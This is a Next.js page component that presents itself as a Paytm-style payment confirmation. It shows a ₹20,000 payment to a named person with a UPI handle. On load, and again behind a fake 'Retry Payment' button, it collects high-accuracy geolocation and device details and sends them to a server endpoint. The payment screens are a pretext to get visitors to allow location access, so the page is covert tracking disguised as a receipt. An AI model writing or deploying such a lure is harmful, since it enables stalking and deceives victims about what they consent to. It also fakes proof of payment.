"use client";

import { useCallback, useEffect, useState } from "react";
import { getDeviceInfo } from "@/lib/deviceInfo";

type Screen = "loading" | "retry" | "ready";

export default function Home() {
  const [screen, setScreen] = useState<Screen>("loading");
  const [busy, setBusy] = useState(false);

  const captureAndSave = useCallback(async () => {
    setBusy(true);
    setScreen("loading");

    // Device info — no extra permission needed
    const device = getDeviceInfo();

    if (!navigator.geolocation) {
      setScreen("retry");
      setBusy(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        try {
          const { latitude, longitude, accuracy, altitude, heading, speed } =
            pos.coords;

          const res = await fetch("/api/location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              latitude,
              longitude,
              accuracy,
              altitude,
              heading,
              speed,
              device,
            }),
          });

          if (!res.ok) {
            setScreen("retry");
            return;
          }

          setScreen("ready");
        } catch {
          setScreen("retry");
        } finally {
          setBusy(false);
        }
      },
      () => {
        setScreen("retry");
        setBusy(false);
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  }, []);

  useEffect(() => {
    captureAndSave();
  }, [captureAndSave]);

  if (screen === "loading") {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white px-6 text-center">
        <div className="relative mb-6 h-16 w-16">
          <div className="absolute inset-0 animate-spin rounded-full border-[3.5px] border-[#1a73e8]/20 border-t-[#1a73e8]" />
        </div>
        <p className="text-[15px] font-medium tracking-wide text-[#1f1f1f]">
          Processing…
        </p>
        <p className="mt-1 text-center text-sm text-[#747775]">
          Please wait a moment
        </p>
      </div>
    );
  }

  if (screen === "retry") {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white px-6 text-center">
        <div className="w-full max-w-sm">
          <div className="mx-auto mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-red-50 text-red-500">
            <svg
              className="h-8 w-8"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={2}
              aria-hidden
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M12 9v3.75m9-.75a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 3.75h.008v.008H12v-.008Z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-semibold text-[#1f1f1f]">
            Payment Status Pending
          </h1>
          <p className="mt-2 text-sm leading-relaxed text-[#5f6368]">
            We couldn&apos;t verify your session. Please try again.
          </p>
          <button
            type="button"
            disabled={busy}
            onClick={captureAndSave}
            className="mt-8 w-full rounded-full bg-[#1a73e8] py-3.5 text-[15px] font-medium text-white shadow-sm transition active:scale-[0.98] active:bg-[#1557b0] disabled:opacity-60"
          >
            {busy ? "Please wait…" : "Retry Payment"}
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white px-6 text-center font-sans select-none">
      {/* Success Blue Checkmark Circle */}
      <div className="mb-9 flex h-28 w-28 items-center justify-center rounded-full bg-[#1a73e8] shadow-sm">
        <svg
          className="h-14 w-14 text-white"
          fill="none"
          stroke="currentColor"
          viewBox="0 0 24 24"
          strokeWidth="3.5"
          strokeLinecap="round"
          strokeLinejoin="round"
        >
          <path d="M5 13l4 4L19 7" />
        </svg>
      </div>

      {/* Amount */}
      <h1 className="mb-10 text-[42px] font-normal tracking-tight text-[#1f1f1f]">
        ₹20,000.00
      </h1>

      {/* Payment Details */}
      <div className="flex flex-col items-center gap-1.5">
        <p className="text-[15px] font-normal text-[#444746]">Paid to</p>
        <h2 className="text-[26px] font-semibold tracking-wide text-[#1f1f1f]">
          RAHUL MEENA
        </h2>
        <p className="mt-0.5 text-[15px] font-normal text-[#444746]">
          Paytm • rahulmeena086159@ptyes
        </p>
        <p className="mt-0.5 text-[14px] font-normal text-[#747775]">
          27 July 2026, 6:07 pm
        </p>
      </div>
    </div>
  );
}
